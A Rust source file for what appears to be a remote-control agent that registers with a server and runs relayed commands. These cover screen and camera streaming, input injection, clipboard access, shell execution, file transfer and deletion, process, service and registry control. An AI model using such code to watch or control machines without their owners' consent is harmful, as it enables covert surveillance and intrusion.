fn handle_command(cfg: &Config, streaming: &Arc<AtomicBool>, cam_streaming: &Arc<AtomicBool>, cmd: &Value) {
    let id = cmd.get("id").and_then(|v| v.as_str()).unwrap_or("").to_string();
    let action = cmd.get("action").and_then(|v| v.as_str()).unwrap_or("").to_string();
    let payload = cmd.get("payload").cloned().unwrap_or(Value::Null);
    log!("cmd: {} ({})", action, id);


    let result: Result<Value, String> = match action.as_str() {
        "screen.capture" => {
            let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(60) as u8;
            capture_jpeg(q).and_then(|(jpg, w, h)| {
                let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
                push_screen(cfg, &b64)?;
                Ok(json!({ "width": w, "height": h, "bytes": jpg.len() }))
            })
        }
        "screen.stream.start" => { streaming.store(true, Ordering::SeqCst); Ok(json!({"streaming": true})) }
        "screen.stream.stop"  => { streaming.store(false, Ordering::SeqCst); Ok(json!({"streaming": false})) }
        "screen.webrtc.start" => {
            let session = payload.get("session").and_then(|v| v.as_str()).unwrap_or("").to_string();
            let ice = payload.get("ice_servers").cloned().unwrap_or(Value::Null);
            if session.is_empty() {
                Err("missing session id".into())
            } else {
                webrtc::start_session(&cfg.device_id, &cfg.device_token, &session, &ice)
                    .map(|_| json!({ "accepted": true, "session": session, "stage": "skeleton" }))
            }
        }
        "screen.webrtc.stop" => {
            let session = payload.get("session").and_then(|v| v.as_str()).unwrap_or("").to_string();
            webrtc::stop_session(&session);
            Ok(json!({ "stopped": true, "session": session }))
        }
        "camera.capture" => {
            let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(65) as u8;
            capture_camera_jpeg(q).and_then(|jpg| {
                let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
                push_camera(cfg, &b64)?;
                Ok(json!({ "bytes": jpg.len() }))
            })
        }
        "camera.stream.start" => { cam_streaming.store(true, Ordering::SeqCst); Ok(json!({"streaming": true})) }
        "camera.stream.stop"  => { cam_streaming.store(false, Ordering::SeqCst); Ok(json!({"streaming": false})) }
        "input.mouse"   => input::mouse(&payload),
        "input.key"     => input::key(&payload),
        "input.lock"    => input::lock_input(&payload),
        "clipboard.get" => input::clipboard_get(),
        "clipboard.set" => input::clipboard_set(&payload),
        // Drawing overlays render on the viewer side — server-side ack only.
        "overlay.draw" | "overlay.clear" => Ok(json!({ "ok": true })),
        // Mic / audio commands
        "mic.listen.start" => {
            #[cfg(windows)]
            {
                let input_device = payload.get("input_device").and_then(|v| v.as_str()).unwrap_or("default");
                log!("mic.listen.start input_device={}", input_device);
                // Mic streaming requires ffmpeg to capture from audio device and stream PCM
                // This is a stub — real implementation needs async ffmpeg capture loop
                Ok(json!({ "ok": true, "status": "mic capture requires ffmpeg audio support" }))
            }
            #[cfg(not(windows))]
            { Ok(json!({ "ok": false, "error": "mic not supported on this platform" })) }
        }
        "mic.listen.stop" => {
            log!("mic.listen.stop");
            Ok(json!({ "ok": true }))
        }
        "mic.devices" => {
            #[cfg(windows)]
            {
                let script = "Get-CimInstance Win32_SoundDevice | Select-Object -ExpandProperty Name";
                match powershell(script) {
                    Ok(out) => {
                        let devices: Vec<Value> = out.lines()
                            .filter(|l| !l.trim().is_empty())
                            .enumerate()
                            .map(|(i, name)| json!({ "id": format!("dev_{}", i), "name": name.trim() }))
                            .collect();
                        Ok(json!({ "inputs": devices, "outputs": devices }))
                    }
                    Err(e) => Ok(json!({ "inputs": [], "outputs": [], "error": e }))
                }
            }
            #[cfg(not(windows))]
            { Ok(json!({ "inputs": [], "outputs": [] })) }
        }
        "mic.output.set" => {
            let device = payload.get("output_device").and_then(|v| v.as_str()).unwrap_or("default");
            log!("mic.output.set device={}", device);
            Ok(json!({ "ok": true, "device": device }))
        }
        "audio.tts" => {
            let text = payload.get("text").and_then(|v| v.as_str()).unwrap_or("");
            if text.is_empty() { Err("missing text".into()) }
            else {
                #[cfg(windows)]
                {
                    let script = format!(
                        "Add-Type -AssemblyName System.Speech; $s=New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Volume=100; $s.Speak('{}')",
                        ps_escape(text)
                    );
                    powershell(&script).map(|_| json!({ "ok": true, "text": text }))
                }
                #[cfg(not(windows))]
                { Err("TTS not supported on this platform".into()) }
            }
        }
        "shell.exec" => {
            let c = payload.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
            if c.is_empty() { Err("empty cmd".into()) } else { Ok(run_shell(c)) }
        }
        "fs.list"   => fs_list(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
        "fs.read"   => fs_read(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
        "fs.delete" => fs_delete(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
        "fs.mkdir"  => fs_mkdir(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
        "fs.rename" => fs_rename(
            payload.get("from").and_then(|v| v.as_str()).unwrap_or(""),
            payload.get("to").and_then(|v| v.as_str()).unwrap_or(""),
        ),
        "fs.zip"    => fs_zip(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
        "fs.unzip"  => fs_unzip(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
        "fs.upload" => fs_upload(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
        "fs.download" => fs_download(
            payload.get("url").and_then(|v| v.as_str()).unwrap_or(""),
            payload.get("dest").and_then(|v| v.as_str()).unwrap_or(""),
        ),
        "proc.list"      => proc_list(),
        "proc.kill"      => proc_kill(payload.get("pid").and_then(|v| v.as_i64()).unwrap_or(0)),
        "proc.tree_kill" => proc_tree_kill(payload.get("pid").and_then(|v| v.as_i64()).unwrap_or(0)),
        "proc.start"     => proc_start(
            payload.get("command").and_then(|v| v.as_str()).unwrap_or(""),
            payload.get("args").and_then(|v| v.as_str()).unwrap_or(""),
        ),
        "reg.list"          => reg_list(payload.get("key").and_then(|v| v.as_str()).unwrap_or("")),
        "reg.read"          => reg_read(payload.get("key").and_then(|v| v.as_str()).unwrap_or("")),
        "reg.write"         => reg_write(&payload),
        "reg.delete"        => reg_delete(
            payload.get("key").and_then(|v| v.as_str()).unwrap_or(""),
            payload.get("name").and_then(|v| v.as_str()).unwrap_or(""),
        ),
        "reg.startup_list"  => reg_startup_list(),
        "services.list"    => services_list(),
        "services.control" => services_control(
            payload.get("name").and_then(|v| v.as_str()).unwrap_or(""),
            payload.get("op").and_then(|v| v.as_str()).unwrap_or(""),
        ),
        "net.connections" => net_connections(),
        "wnd.list"        => wnd_list(),
        "wnd.focus"       => wnd_action("focus",     payload.get("title").and_then(|v| v.as_str()).unwrap_or("")),
        "wnd.close"       => wnd_action("close",     payload.get("title").and_then(|v| v.as_str()).unwrap_or("")),
        "wnd.minimize"    => wnd_action("minimize",  payload.get("title").and_then(|v| v.as_str()).unwrap_or("")),
        "wnd.maximize"    => wnd_action("maximize",  payload.get("title").and_then(|v| v.as_str()).unwrap_or("")),
        "browser.list"    => browser_list(),
        "sysinfo.snapshot" => sysinfo_snapshot(),
        "ping"            => Ok(json!({ "pong": true, "ts": now_ms_v(), "uptime_s": STARTED.elapsed().as_secs() })),
        a if a.starts_with("system.") => system_action(a, &payload),
        _ => Err(format!("unknown action: {}", action)),
    };

    // Always echo the result over the relay so the viewer that originated
    // the request can correlate by id without a round-trip through HTTP.
    match &result {
        Ok(v)  => relay::send_result(&id, true, v.clone(), None),
        Err(e) => relay::send_result(&id, false, Value::Null, Some(e.clone())),
    }
    // Also POST to /agent/result so HTTP-only callers (the queued command
    // path) get their reply.
    match result {
        Ok(v)  => send_result(cfg, &id, true, v, None),
        Err(e) => send_result(cfg, &id, false, Value::Null, Some(e)),
    }
}

// ---------- main loops ----------

fn main() {
    // Override server with env var or CLI arg.
    let args: Vec<String> = std::env::args().collect();
    let server_override = std::env::var("SENTINEL_SERVER_URL").ok()
        .or_else(|| args.iter().position(|a| a == "--server").and_then(|i| args.get(i + 1).cloned()));

    let cfg = match load_config() {
        Some(c) => {
            log!("loaded existing config for device {}", c.device_id);
            c
        }
        None => {
            let server = server_override.unwrap_or_else(|| DEFAULT_SERVER.to_string());
            log!("first run — auto-registering at {}", server);
            loop {
                match auto_register(&server) {
                    Ok(c) => { log!("registered as {}", c.device_id); break c; }
                    Err(e) => { log!("register failed: {} — retry in 10s", e); thread::sleep(Duration::from_secs(10)); }
                }
            }
        }
    };

    // Force lazy init of STARTED.
    let _ = STARTED.elapsed();

    let cfg = Arc::new(cfg);
    let streaming = Arc::new(AtomicBool::new(false));
    let cam_streaming = Arc::new(AtomicBool::new(false));

    // Heartbeat thread (every 5s)
    {
        let cfg = cfg.clone();
        thread::spawn(move || loop {
            heartbeat(&cfg);
            thread::sleep(Duration::from_secs(5));
        });
    }

    // Start the persistent HidenHost relay connection (agent role).
    let cmd_rx = relay::start(cfg.device_id.clone());

    // Background worker: consume cmd envelopes from the relay and dispatch
    // them through the same handler the HTTP poll path uses. The worker
    // thread spins up a new OS thread per command so a slow capture/exec
    // doesn't block the relay queue.
    {
        let cfg = cfg.clone();
        let streaming = streaming.clone();
        let cam_streaming = cam_streaming.clone();
        thread::spawn(move || {
            for env in cmd_rx {
                if env.event != "cmd" { continue; }
                // The viewer sends `{ type:"cmd", payload:{ action, ... } }`.
                // hiden.rs strips the outer envelope and gives us
                // `event="cmd"` + `payload=<inner>`. We still need to wrap
                // it for handle_command, which expects `{ id, action,
                // payload }`. The viewer doesn't always supply an `id`,
                // so we synthesise one for correlation.
                let id = env
                    .payload
                    .get("id")
                    .and_then(|v| v.as_str())
                    .map(String::from)
                    .unwrap_or_else(|| format!("relay-{}", chrono_like_ts()));
                let action = env.payload.get("action").and_then(|v| v.as_str()).unwrap_or("").to_string();
                if action.is_empty() { continue; }
                // Use the same payload object as inner — handle_command
                // reads its own sub-fields directly.
                let cmd = json!({ "id": id, "action": action, "payload": env.payload });
                let cfg = cfg.clone();
                let streaming = streaming.clone();
                let cam_streaming = cam_streaming.clone();
                thread::spawn(move || {
                    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                        handle_command(&cfg, &streaming, &cam_streaming, &cmd);
                    }));
                });
            }
        });
    }

    // Screen-stream thread — pushes JPEG frames over the relay (TCP) AND
    // mirrors them to the HTTP endpoint as a hydration fallback.
    {
        let cfg = cfg.clone();
        let streaming = streaming.clone();
        thread::spawn(move || {
            let last_err: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));
            loop {
                if streaming.load(Ordering::SeqCst) {
                    // Quality 45 is a good bandwidth/latency tradeoff at 25fps.
                    let res = capture_jpeg(45).map(|(jpg, _w, _h)| {
                        let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
                        relay::send_screen_frame(&b64);
                        if !relay::connected() {
                            let _ = push_screen(&cfg, &b64);
                        }
                    });
                    if let Err(e) = res {
                        let mut g = last_err.lock().unwrap();
                        if g.as_deref() != Some(e.as_str()) {
                            log!("stream err: {}", e);
                            *g = Some(e);
                        }
                        thread::sleep(Duration::from_secs(2));
                    } else {
                        // ~25 fps when relay-connected, ~4 fps otherwise.
                        let interval = if relay::connected() { 40 } else { 250 };
                        thread::sleep(Duration::from_millis(interval));
                    }
                } else {
                    thread::sleep(Duration::from_millis(200));
                }
            }
        });
    }

    // Camera-stream thread — same shape as screen.
    {
        let cfg = cfg.clone();
        let cam_streaming = cam_streaming.clone();
        thread::spawn(move || {
            let last_err: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));
            loop {
                if cam_streaming.load(Ordering::SeqCst) {
                    let res = capture_camera_jpeg(65).map(|jpg| {
                        let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
                        relay::send_camera_frame(&b64);
                        if !relay::connected() {
                            let _ = push_camera(&cfg, &b64);
                        }
                    });
                    if let Err(e) = res {
                        let mut g = last_err.lock().unwrap();
                        if g.as_deref() != Some(e.as_str()) {
                            log!("cam err: {}", e);
                            *g = Some(e);
                        }
                        thread::sleep(Duration::from_secs(3));
                    } else {
                        let interval = if relay::connected() { 200 } else { 700 };
                        thread::sleep(Duration::from_millis(interval));
                    }
                } else {
                    thread::sleep(Duration::from_millis(500));
                }
            }
        });
    }

    // No more HTTP command polling — commands arrive over the persistent
    // hidenhost WebSocket. Park the main thread; heartbeat/stream/relay
    // workers keep running in the background.
    loop {
        thread::sleep(Duration::from_secs(3600));
    }
}
